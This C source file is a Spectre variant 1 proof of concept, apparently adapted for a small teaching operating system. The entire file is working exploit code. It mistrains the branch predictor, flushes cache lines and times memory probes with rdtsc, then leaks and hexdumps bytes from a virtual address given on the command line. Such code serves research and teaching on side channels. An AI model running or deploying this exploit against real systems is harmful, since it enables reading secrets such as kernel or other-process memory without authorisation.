#include <ulib.h>
#include <stdio.h>
#include <string.h>
#include <error.h>
#include <unistd.h>
#include <stdlib.h>

#define printf(...)                     fprintf(1, __VA_ARGS__)
#define putc(c)                         printf("%c", c)


#define OFFSET 4096

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
uint8_t array2[256 * OFFSET];
size_t holder[16] = {0};

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

static inline void flush(void *adrs)
{
  asm volatile (
     "mfence         \n"
     "clflush 0(%0)  \n"
     :
     : "r" (adrs)
     :
  );
}

static inline unsigned long probe(volatile void *adrs)
{
  volatile unsigned long time;

  asm volatile (
    "mfence             \n"
    "lfence             \n"
    "rdtsc              \n"
    "lfence             \n"
    "movl %%eax, %%esi  \n"
    "movl (%1), %%eax   \n"
    "lfence             \n"
    "rdtsc              \n"
    "subl %%esi, %%eax  \n"
    "clflush 0(%1)      \n"
    : "=a" (time)
    : "c" (adrs)
    :  "%esi", "%edx");

  return time;
}

static void __always_inline victim_function(size_t x)
{
    flush(holder + 7);
    if (holder[7] < array1_size)
    {
        temp &= array2[array1[x] * OFFSET];
    }
}

/********************************************************************
 Analysis code
 ********************************************************************/
#define CACHE_HIT_THRESHOLD (150) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
{
    static int results[256];
    int tries, i, j, k, mix_i, junk = 0;
    size_t training_x, x;
    register uint64_t time1;
    volatile uint8_t *addr;

    for (i = 0; i < 256; i++)
        results[i] = 0;
    for (tries = 49; tries > 0; tries--)
    {

        /* Flush array2[256*(0..255)] from cache */
        for (i = 0; i < 256; i++)
            flush(&array2[i * OFFSET]);

        /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
        training_x = tries % array1_size;
        for (j = 30; j >= 0; j--)
        {
            flush(&array1_size);
            // for (volatile int z = 0; z < 100; z++)
            yield();

            /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
            /* Avoid jumps in case those tip off the branch predictor */
            x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
            x = (x | (x >> 16));         /* Set x=-1 if j&6=0, else x=0 */
            x = training_x ^ (x & (malicious_x ^ training_x));
            holder[7] = x;

            /* Call the victim! */
            victim_function(x);
        }

        /* Time reads. Order is lightly mixed up to prevent stride prediction */
        for (i = 0; i < 256; i++)
        {
            mix_i = ((i * 167) + 13) & 255;
            addr = &array2[mix_i * OFFSET];
            time1 = probe(addr);
            if (time1 <= CACHE_HIT_THRESHOLD)
                results[mix_i]++; /* cache hit - add +1 to score for this value */
        }

        /* Locate highest & second-highest results results tallies in j/k */
        j = k = -1;
        for (i = 0; i < 256; i++)
        {
            if (j < 0 || results[i] >= results[j])
            {
                k = j;
                j = i;
            }
            else if (k < 0 || results[i] >= results[k])
            {
                k = i;
            }
        }
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
    }
    results[0] ^= junk; /* use junk so code above won’t get optimized out*/
    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
}

int main(int argc, const char **argv)
{
    if (argc < 3)
    {
        printf("Usage: %s <vaddr> <size>\n", argv[0]);
        return 0;
    }

    size_t vaddr = (size_t)strtoul(argv[1], NULL, 0);
    size_t size = (size_t)strtoul(argv[2], NULL, 10);

    size_t malicious_x = vaddr - (size_t)array1;
    int i, score[2], len = size;
    uint8_t value[2];

    for (i = 0; i < sizeof(array2); i++)
        array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */

    int width = 16;
    if (width > len)
        width = len;
    char buffer[width];

    int max_tries = 30;

    printf("Reading %d bytes:\n", len);
    for (int i = 0; i < len; ++i, ++malicious_x)
    {
        for (int k = 0; k < max_tries; ++k)
        {
            readMemoryByte(malicious_x, value, score);
            buffer[i % width] = value[0];
            if (value[0])
                break;
        }

        if ((i + 1) % width == 0)
        {
            printf("0x%8x: ", malicious_x - (width - 1) + (size_t)array1);
            printf("| ");
            for (int k = 0; k < width; k++)
            {
                printf("%02x ", (unsigned char)buffer[k]);
            }
            printf("| ");
            for (int k = 0; k < width; k++)
            {
                printf("%c", (buffer[k] >= 32 && buffer[k] <= 126) ? buffer[k] : '.');
            }
            printf(" |\n");
        }
    }
    return (0);
}